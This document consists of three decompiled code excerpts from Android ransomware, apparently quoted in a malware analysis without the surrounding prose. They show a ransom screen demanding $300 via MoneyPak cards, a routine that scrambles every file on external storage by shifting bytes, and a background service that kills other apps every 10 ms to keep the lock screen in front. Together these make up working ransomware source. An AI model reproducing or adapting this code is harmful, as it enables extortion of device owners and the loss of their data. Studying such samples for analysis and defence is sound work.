["```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n...\n        <TextView android:textAppearance=\"?android:attr/textAppearanceMedium\"\nandroid:textSize=\"16sp\" android:textColor=\"#ffffffff\" android:id=\"@+id/textView1\"\nandroid:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" \nandroid:layout_marginLeft=\"10dp\" android:layout_marginTop=\"10dp\" android:layout_\nmarginRight=\"10dp\" android:layout_marginBottom=\"10dp\" android:text=\"To unlock your \ndevice and to avoid other legal consequences, you are obligated to pay a release fee \nof $300\\. Payable through GreenDot MoneyPak (you have to purchase MoneyPak card. load \nit with $300 and enter the code). You can buy the card at any store or gas station,\npayzone or paypoint.\"/>\n      </LinearLayout>\n...\n        <TextView android:textSize=\"20sp\" android:textColor=\"#ffffffff\" \nandroid:gravity=\n\"center\" android:id=\"@+id/textView2\" android:padding=\"15dp\" android:layout_width=\n\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"Wrong MoneyPack code.\nYou have only 3 attempts. Please try again\"/>\n      </LinearLayout>\n...\n        <EditText android:id=\"@+id/et_number\" android:layout_width=\n\"match_parent\" android:layout_height=\"wrap_content\" android:layout_marginLeft=\"30dp\" \nandroid:layout_marginRight=\"30dp\" android:hint=\"Enter $300 MoneyPak code\" \nandroid:ems=\"10\" android:maxLength=\"14\" android:inputType=\"number\"/>\n      <LinearLayout android:gravity=\"center\" android:layout_width=\n\"match_parent\" android:layout_height=\"wrap_content\">\n...\n        <TextView android:textSize=\"30sp\" android:textColor=\"#ffffffff\" \nandroid:gravity=\"center\" android:id=\"@+id/textView3\" android:padding=\"20dp\" \nandroid:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" \nandroid:text=\"Your request will be processed within 24 hours\"/>\n      </LinearLayout>\n```", "```\npublic static void goToDir(File file, boolean z) {\n  Log.v(\"CRYPT\", file.getAbsolutePath());\n  if (z) {\n    try {\n      byte[] readBytes = readBytes(\n        String.valueOf(String.valueOf(file.getAbsolutePath().substring(\n          0, file.getAbsolutePath().lastIndexOf(\"/\"))) + \"/\" + file.getName()));\n      byte[] bArr = new byte[readBytes.length];\n      for (int i = 0; i < readBytes.length; i++) {\n        bArr[i] = (byte) (readBytes[i] + 1);\n      }\n      BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(\n        new FileOutputStream(new File(file.getAbsolutePath())));\n      bufferedOutputStream.write(bArr);\n      bufferedOutputStream.flush();\n      bufferedOutputStream.close();\n    } catch (Throwable th) {\n      File[] listFiles = new File(file.getAbsolutePath()).listFiles();\n      for (File goToDir : listFiles) {\n        goToDir(goToDir, z);\n      }\n    }\n  } else {\n    byte[] readBytes2 = readBytes(\n      String.valueOf(String.valueOf(file.getAbsolutePath().substring(\n        0, file.getAbsolutePath().lastIndexOf(\"/\"))) + \"/\" + file.getName()));\n    byte[] bArr2 = new byte[readBytes2.length];\n    for (int i2 = 0; i2 < readBytes2.length; i2++) {\n      bArr2[i2] = (byte) (readBytes2[i2] - 1);\n    }\n    BufferedOutputStream bufferedOutputStream2 = new BufferedOutputStream(\n      new FileOutputStream(new File(file.getAbsolutePath())));\n    bufferedOutputStream2.write(bArr2);\n    bufferedOutputStream2.flush();\n    bufferedOutputStream2.close();\n  }\n}\n\npublic void encryptAll() {\n  File[] listFiles = new File(\n    String.valueOf(Environment.getExternalStorageDirectory())).listFiles();\n  for (File goToDir : listFiles) {\n    goToDir(goToDir, true);\n  }\n}\n```", "```\n/* compiled from: BackgroundService */\npublic class Hans5 extends Service {\n  public static Hans5 Activity = null;\n  public static Timer LockerExecutor = null;\n  public static PowerManager.WakeLock wakeLock;\n\n  public static void BringToFront(Context context) {\n    try {\n      Intent intent = new Intent(context.getApplicationContext(), Hans2.class);\n      intent.setFlags(272629760);\n      context.startActivity(intent);\n    } catch (Throwable th) {\n      th.printStackTrace();\n    }\n  }\n\n  private TimerTask LockerTimer() {\n    return new TimerTask() {\n      public void run() {\n        try {\n          if (Hans2.Activity != null && !Hans2.STOP &&\n              ((PowerManager) Hans2.Activity.getSystemService(\"power\")).isScreenOn()) {\n            ActivityManager activityManager =\n              (ActivityManager) Hans2.Activity.getSystemService(\"activity\");\n            List<ActivityManager.RunningTaskInfo> runningTasks =\n              activityManager.getRunningTasks(1);\n            ComponentName componentName = runningTasks.get(0).topActivity;\n            String packageName = componentName.getPackageName();\n            if (!packageName.equals(\"qok.wrrgz.xcfwc\") &&\n                !packageName.equals(\"com.android.settings\")) {\n              Process.killProcess(runningTasks.get(0).id);\n              Hans2.Activity.finishActivity(runningTasks.get(0).id);\n              activityManager.killBackgroundProcesses(\n                componentName.getPackageName());\n              Hans5.BringToFront(Hans2.Activity.getApplicationContext());\n            }\n          }\n          if (Hans5.Activity == null) {\n            Intent intent = new Intent();\n            intent.setAction(\"qok.wrrgz.xcfwc.Hans5\");\n            Hans5.this.getApplicationContext().startService(intent);\n          }\n        } catch (Throwable th) {\n          th.printStackTrace();\n        }\n      }\n    };\n  }\n\n  public void onStart(Intent intent, int i) {\n    Activity = this;\n    wakeLock = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"locker\");\n    wakeLock.acquire();\n    startTimer(LockerExecutor, LockerTimer(), 0, 10);\n    super.onStart(intent, i);\n  }\n\n  ...\n}\n```"]